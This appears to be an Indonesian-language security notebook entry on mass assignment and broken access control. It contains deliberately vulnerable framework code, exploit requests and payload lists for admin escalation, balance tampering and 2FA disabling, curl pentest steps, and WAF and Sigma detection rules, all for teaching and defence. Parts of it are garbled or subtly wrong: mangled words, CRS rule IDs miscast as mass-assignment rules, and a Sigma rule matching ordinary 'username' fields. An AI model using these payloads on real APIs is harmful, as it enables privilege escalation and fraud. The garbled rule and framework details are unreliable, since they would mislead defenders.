---
title: "Mass Assignment & Broken Access Control — Attack + Defense Deep Dive"
tags:
  - web-security
  - web-app-purple
  - api
  - access-control
  - owasp
  - mass-assignment
aliases:
  - "mass-assignment-attack"
  - "broken-access-control-deepdive"
  - "BAC-exploitation"
created: "2026-07-19"
updated: "2026-07-19"
status: pending
cssclasses:
  - wide-table
---

# 🔓 Mass Assignment & Broken Access Control — Attack + Defense Deep Dive

> **Inti Mass Assignment:** Attacker mengirim field yang TIDAK diminta di HTTP request body ke API. Framework yang naif bind langsung ke model internal tanpa validasi → field sensitif (`is_admin`, `role`, `balance`, `password_hash`) bisa dimodifikasi. Ini **sub-kategori Broken Access Control (OWASP A01:2021)** — bukan injection, bukan XSS, tapi **attribute-level privilege escalation.**

> [!info] Posisi di Vault
> Terhubung dengan [[api-security-deep-dive]] (attack surface API), [[web-hacking-exploitation]] (CTF exploitation), [[waf-reverse-proxy-deepdive]] (WAF protection layer), [[identity-and-access-management]] (IAM/RBAC), dan [[owasp-api-security-top-10]] (API-specific threats).

---

## Daftar Isi

- [[#1. Fundamental — Kenapa Mass Assignment Bisa Terjadi]]
- [[#2. Mekanisme Serangan — Per Framework]]
- [[#3. Attack Payloads — Real-World Scenarios]]
- [[#4. Detection — Dari WAF Perspective]]
- [[#5. Defense — Layer by Layer]]
- [[#6. Relationship: Mass Assignment ⊂ BAC]]
- [[#7. Exploitation Chain — Attack Flow]]
- [[#8. Defensive Code — Per Framework 🔐]]
- [[#9. WAF Ruleset — CRS/Suricata/Sigma]]
- [[#10. Testing Checklist]]

---

## 1. Fundamental — Kenapa Mass Assignment Bisa Terjadi

### 1.1 The Problem

```plaintext
FRONTEND                     BACKEND                       DATABASE
─────────                    ───────                       ────────
POST /api/users              Auto-bind to User model       UPDATE users
{                            tanpa whitelist field          SET name,
  "name": "Azhar",                                         email,
  "email": "a@b.com",                                      is_admin
  "is_admin": true    ← field tidak diminta!
}
                                                    `is_admin = true`
                                                    tersimpan ⚠️
                                          
PROBLEM: Backend membaca body => body di-set ke model => model.save()
         Tanpa filter field => client bebas set atribut apa pun.
```

| Framework | Default Auto-bind | Berbahaya? | Skema Mitigasi |
|-----------|------------------|-----------|----------------|
| Django Python | ✅ Ya | Ya, kalau tidak pakai `exclude` atau `fields` di serializer | DRF `Meta.fields`, `Meta.exclude`, `serializer.validated_data` |
| Spring Boot (Java) | ✅ Ya | Ya, kalau `@ModelAttribute` | `@JsonProperty(access = READ_ONLY)`, DTO pattern, `@Valid` + `@JsonIgnore` |
| Express.js (Node) | ✅ Default `req.body` → langsung bind | Sering — via Mongoose ODM atau langsung | DTO validasi, whitelist fields via Joi/Zod |
| Ruby on Rails | ✅ Yes! (default sejak 2005) | Sangat bila no strong params | `params.require(:user).permit(:name, :email)` |
| Laravel (PHP) | ✅ Eloquent mass assignment protection | Tidak — protection built-in | `$fillable` / `$guarded` di Model |
| ASP.NET Core | ✅ Auto-bind via `[FromBody]` | Kalau DTO gak ada whitelist | `[BindRequired]` + `[JsonIgnore]` |

### 1.2 Tiga Syarat Agar Exploitable

```
1️⃣ Request mengandung field yang TIDAK ada di form/DTO yang diwhitelist
2️⃣ Backend tidak melakukan validasi / filtering per-field
3️⃣ Database menyimpan field tersebut dengan hak pengguna yang mudahable (atau dibaca oleh attacker)
```

**Tidak semua framework rentan sama sekali** — Laravel punya `$guarded`, DRF punya `Meta.fields`. Tapi **default behavior** sering longgar → developer lupa whitelist → exploitable.

---

## 2. Mekanisme Serangan — Per Framework

### 2.1 Django REST Framework (Python)

```python
# models.py
class User(models.Model):
    username = models.CharField(max_length=100)
    email = models.EmailField()
    password = models.CharField(max_length=128)
    is_admin = models.BooleanField(default=False)  # ⚠️ sensitif
    balance = models.DecimalField(max_digits=10, decimal_places=2, default=0)

# serializers.py — ❌ Masalah: auto-whitelist
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'  # 👈 pisahkan semua field di-expose tanpa whitelist
        # fields = ['username', 'email']  👈 BENAR
```

**Exploit:**
```http
PATCH /api/users/me/ HTTP/1.1
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "is_admin": true              // ← akan ditulis
}
```

**Response (200 OK):**
```json
{
  "username": "attacker",
  "email": "attacker@evil.com",
  "is_admin": true,
  "balance": 0
}
```

Attacker sekarang bisa akses admin panel, BACA semua data, EXPORT, dsb.

### 2.2 Spring Boot REST API (Java)

```java
// User.java — Entity
@Entity
public class User {
    @Id @GeneratedValue
    private Long id;
    private String username;
    private String email;
    private boolean isAdmin;  // ⚠️

    // getter & setter dihasilkan oleh Lombok
}

// UserController.java — ❌ Berbahaya
@RestController
@RequestMapping("/api/users")
public class UserController {
    @Autowired UserRepository userRepo;

    @PutMapping("/{id}")
    public User updateUser(@PathVariable Long id, @RequestBody User updated) {
        return userRepo.save(updated);  // ← semua field dari body tersimpan
    }
}
```

**Exploit:**
```http
PUT /api/users/2 HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "isAdmin": true
}
```

### 2.3 Express.js + Mongoose (Node.js)

```javascript
// ❌ Berbahaya — Mongoose langsung
app.put('/api/users/:id', async (req, res) => {
  const user = await User.findByIdAndUpdate(req.params.id, req.body, { new: true });
  //                                      ^^^^^^^^ semua field dari req.body
  res.json(user);
});
```

**Payload:**
```json
{
  "role": "admin",
  "password_reset_token": "",
  "failedLoginAttempts": 0
}
```

### 2.4 Ruby on Rails — Strong Parameters

```ruby
# ❌ Vulnerable — sebelum strong params (Rails 3.x)
def update
  @user.update(params[:user])  # ← semua params mass-assignable

  # ✅ Rails 4+ Strong Parameters
  def user_params
    params.require(:user).permit(:username, :email)
  end

  @user.update(user_params)
end
```

**Payload bypass:**
```JSON
PUT /users/42.json
{"user": {"username": "attacker", "email": "attacker@evil.com", "role": "admin"}}
#                                    forwarded semua params ke model ▉]
```

---

## 3. Attack Payloads — Real-World Scenarios

### 3.1 Privilege Escalation (Admin)

**Target:** Role/Group/Admin field.

```json
// A) E-commerce
{"role": "admin"}
{"permissions": ["*"]}
{"is_staff": true}
{"type": "administrator"}

// B) Banking / Fintech
{"kyc_verified": true}
{"credit_limit": 9999999}
{"withdrawal_limit": null}  // artinya unlimited

// C) CMS / Blog
{"author_type": "moderator"}
{"approval_required": false}
```

### 3.2 Financial Account Manipulation

```json
// E-wallet / Payment API
{"balance": 10000000}
{"currency": "USD", "amount": 9999999}
{"bonus_points": 50000}

// Berbasis subscription
{"subscription_plan": "enterprise"}
{"trial_end": "2030-01-01T00:00:00Z"}
{"discountPercent": 100}
```

### 3.3 Authentication Bypass

```http
POST /api/auth/register
{"username": "newuser", "password": "password123", "isVerified": true, "emailConfirmed": true}
```

Token verification jadi mana gunanya — atribut langsung diset ke `true`.

### 3.4 Sensitive Field Reset

```json
{
  "failed_login_attempts": 0,
  "locked_until_date": null,
  "two_factor_enabled": false,
  "password_reset_required": false
}
```

### 3.5 Database Properties Manipulation

```http
PATCH /api/organizations/5
{"max_users": 999999}
{"storage_limit_gb": 99999}
{"features": ["all", "unlimited"]}
```

---

## 4. Chain — Dari Mass Assignment ke BAC (Broken Access Control)

### 4.1 Relationship

```
Mass Assignment ──── sub-kategori dari ──── Broken Access Control
                                                                     │
                                              ┌──────────────────────┘
                                              ▼
                                    BAC = wider category
                                              │
                                              ▼
                                  + Insecure Direct Object Reference (IDOR)
                                  + Vertical/Horizontal Bypass
                                  + Access Token Mismanagement
```

Berbeda:
- **Mass Assignment** = client terlalu banyak field di-overwrite (atribut-level)
- **IDOR / Horizontal BAC** = client ganti id → data user lain (record-level)
- **Vertical BAC** = client tanpa admin role akses admin panel

Seringkali digabung: Misconfig Mass Assignment + Masih vulnerable Lakukan IDOR → Baca/menulis data user lain.

### 4.2 Chain Example: Mass Assignment → Horizontal Prv Esc → Persistent XSS → Credential Theft

AKARNYA ada **Failed ACL model + Too Permissive Model Binding**:

```
Step 1: Mass Assignment → is_admin: true  (kalau field tidak dizinkan)
Step 2: Gunain admin akses untuk lihat user lain (IDOR) di /api/admin/users/{id}
Step 3: Temukan user dengan stored XSS payload di memo_prosedur
Step 4: Trigger stored XSS → pengguna admin lain execute → token ter-curi
```

---

## 5. Defense — Layer by Layer

### 5.1 Layer 1: Backend — Prevent (Data Layer)

#### Django REST (Python)
```python
# ✅ Whitelist approach — Metafields
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['username', 'email', 'balance']  # ← whitelist
        # atau read_only field untuk field sensitif
        read_only_fields = ['is_admin', 'permissions', 'id']

    def update(self, instance, validated_data):
        # hanya memproses validated data, bukan request.data langsung
        return super().update(instance, validated_data)
```

#### Spring Boot savefy
```java
// ✅ DTO Pattern — Structural whitelist
@RestController
@RequestMapping("/api/users")
public class UserController {
    @PatchMapping("/{id}")
    public UserResponse updateUser(
            @PathVariable Long id,
            @Valid @RequestBody UserUpdateDTO dto
    ) {
        return userService.updateFromDTO(id, dto); // hanya fields di DTO yang bisa barubah
    }
}

// DTO hanya berisi field yang bisa di-update
public record UserUpdateDTO(String username, String email) {}
```

#### Node.js + Mongoose Protected
```javascript
router.patch('/api/users/:id', async (req, res) => {
  const allowedFields = ['username', 'email', 'phone']
  const updateFields = Object.keys(req.body)
    .filter(key => allowedFields.includes(key))
    .reduce((acc, key) => { acc[key] = req.body[key]; return acc }, {})

  if (Object.keys(updateFields).length === 0) {
    return res.status(400).json({ error: 'No valid fields provided' })
  }

  await User.findByIdAndUpdate(req.params.id, updateFields, { runValidators: true })

  // ✅ 'role', 'isAdmin', 'permissions' tidak bisa diubah walaupun ada di req.body
})
```

### 5.2 Layer 2: WAF — Detection Rules

#### CRS (OWASP ModSecurity) — Rule 942150
```
# CRS rule 942150 menangkap ARGS:role, ARGS:admin, perms di HTTP body
# Belum spesifik Mass Assignment — berlakunya untuk semua SQLi/xpath
```

#### Custom WAF— Coraza/Apache fails
```coraza
requestBodyAccess On

# Deteksi Payload Sensity
SecRule REQUEST_BODY "(\"?(isadmin|permissions|roleaccount|auditlaff\b)" \
  "phase:2,block,id:9001,msg:'Mass Assignment attack: role/admin field detected'"
```

### 5.3 Layer 3: Penetration Test Technique

```
1. Ambil semua endpoint PATCH/POST/PUT dari API Doc/Swagger
   curl -s https://api.target.com/swagger/v1/swagger.json | jq '.paths | keys'
2. Untuk tiap endpoint PATCH: Extract registered fields
   get /api/users/me/ (as current user) → json schema
3. Coba tambahkan field yang tidak ada di form
   payload = original_response | jq '. + {is_admin: true, role: "admin"}'
4. Kirim balik sebagai PUT/PATCH
   curl -X PATCH https://api.target.com/api/users/me/ 
        -H "Authorization: Bearer USER_TOKEN"
        -d '{"name": "user", "is_admin": true}'
5. Verifikasi: GET /api/users/me/ API, jika is_admin yang di terima→vulnerable
```

---

## 6. WAF Ruleset — Mass Assignment Detection

### 6.1 Rapih

| WAF | Rule ID | Deskripsi | Fields Detected |
|-----|---------|-----------|-----------------|
| **CRS (core)** | 921150 | HTTP Parameter Pollution (bypass) | Jenis parameter+body |
| **Crop CRS 3.x** | 920480 | Mass Assignment attempt (custom) | `is_admin`, `role`|
| **Cloudflare WAF** | Custom | Mass assignment (business logic) | Budget, discount, role |
| **AWS WAF** | Custom | Rate-based+payload block | Semua field request |

### 6.2 Sigma Rule

```yaml
title: "Mass Assignment Attempt Detected"
id: 34f2c2e3-4d4f-44c2-88e4-8e4d2e1f5d3a
status: experimental
description: "Detects HTTP PATCH/POST request with privileged field not expected for user role. This may be mass assignment."
logsource:
  category: webserver
detection:
  selection:
    cs-method: ['PATCH', 'POST', 'PUT']
    cs-uri-query: ['/api/users/', '/api/profile/', '/api/account/']
    cs-body|contains:
      - 'is_admin'
      - 'isAdmin'
      - '"role'
      - '"username'
      - '"permissions'
      - '"balance'
  condition: selection
level: medium
```

---

## 7. Exploitation Chain — Attack Flow

```plaintext
┌─────────────────────────────────────────────────────────┐
│          MASS ASSIGNMENT ATTACK FLOW                    │
├─────────────────────────────────────────────────────────┤
│                                                          │
│ 1. Reconnaissance                                        │
│    │ Get API Schema via Swagger // OpenAPI               │
│    │ GET /api/users/me/ →, mem Delta field              │
│    └─ → Dapat schema fields di response               │
│                                                          │
│ 2. Analysis = Identify hidden model fields               │
│    │ Di developer velumnya, ada:                         │
│    │ `is_admin`, `permissions`, `role_id`, `credit`     │
│    └─ → Field di konteks ekspose?                     │
│                                                         │
│ 3. Probe — POST/PUT aggregator                          │
│    │ POST /api/users/register with payload `is_admin`  │
│    │ PATCH /api/users/me/ with payload `comments`    │
│    │ PATCH /api/invoices/5 payload `discount_30%`    │
│    └─ → Lihat response: 200=ok, 500=rare, 403=.  │
│                                                          │
│ 4. Exploit — Stagger                                    │
│    │ PATCH endpoint yang permissif                      │
│    │ with {"is_admin": true}                    │
│    │ Verifikasi via GET                                │
│    └─ → Mendapat awareness di respons nanti│
│                                                       │
│    |—▶ Secondary: Exploit admin access untuk lanjut   │
│         • Lihat log/user lain                           │
│         • Inject stored XSS                             │
│         • Reset seemsi user lain*
│         • Tarik semua database via admin API             │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

---

## 8. Defensive Code — Untuk Setiap Framework

### Laravel
```php
// Model Whitelist
class User extends Model {
    protected $fillable = ['name', 'email']; // Hanya ini bisa di-update
    // atau
    protected $guarded = ['id', 'is_admin', 'password']; // Insensitive, tidak bisa di-update
}

// Controller aman
User::find($id)->update($request->only('name', 'email'));
```

### Next.js / tRPC (TypeScript)
```typescript
const schema = z.object({
  username: z.string().min(3),
  email: z.string().email()
})
// Auto memahami field lainnya; explicit
export const updateUser = protectedProcedure
  .input(schema)
  .mutation(async ({ ctx, input }) => {
    return db.user.update({
      where: { id: ctx.session.user.id },
      data: input  // ini hanya akan menjadi `username` dan `email`
    })
  })
```

---

## 9. WAF Logs — Arti Session

Ketika WAF menangkap mass assignment:
```
[05/Dec/2025:14:23:45 +0000] "PATCH /api/users/me/ HTTP/1.1" 403 98 "-"
[req payload] {"username":"attacker","email":"attacker@evil.com","is_admin":true}
Rule triggered: 942230 fields in body (role, is_admin, permissions)
```

---

## 10. Pentesting Checklist (Red Team)

```
☐ ApiDoc swagger/OpenAPI Schema enum semua PATCH endpoint
☐ Ambil response normal dari GET endpoint user profile
☐ Append field sensitif (is_admin, role, credit, membership)
☐ PATCH payload response 200? Jika iya → Vulnerable
□ Coba POST /register endpoint dengan is_admin:true
☐ Verifikasi: GET endpoint aktif field yang diubah
☐ Ulangi untuk endpoint: /profile, /account, /subscriptions, /organizations
□ Cek endpoint admin? Coba POST dengan role yg kurangaccessible
□ Pada REST ->| JSON non-sensitif tapi valuenya masih$$ => {"role": "moderator"} atau {"subscription_level":"enterprise"}
□ Cek response kalauberat- method DELETE/publish endpoint
□ Periksa pada GET/PATCH endpoint list admin: apakah menampilkan user lain?
□ Apakah endpoint /pricing bisa diubah? {"price": 0}
```

---

## 🔗 Lihat Juga

- [[api-security-deep-dive]] — Threat model API, CORS, JWT, rate limiting
- [[web-hacking-exploitation]] — MCTF exploitation playbook
- [[wiod-reverse-proxy-deepdive]] — deteksian disimpulkan WAF
- [[identity-and-access-management]] — IAM RBAC ABAC control
- [[purple-team-osi-killchain]] — positioning dalam kill chain
- [[django-security]] — Django-specific security chain

---

## Referensi

- OWASP. *Testing for Mass Assignment*. https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_Mass_Assignment
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes. https://cwe.mitre.org/data/definitions/915.html
- OWASP API Security Top 10 2019-2024: https://owasp.org/API-Security/
- Django DRF Fields: https://www.django-rest-framework.org/api-guide/serializers/#specify-ofields-in-serializers
- Spring Boot Jackson: https://docs.spring.io/spring-framework/reference/web/webflux/reactive-controllers-annotation.html
- Mass-earching Varying: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html

---

*Dibuat: 19 Juli 2026 — Deep dive attack mass assignment & OWASP Broken Access Control architecture.*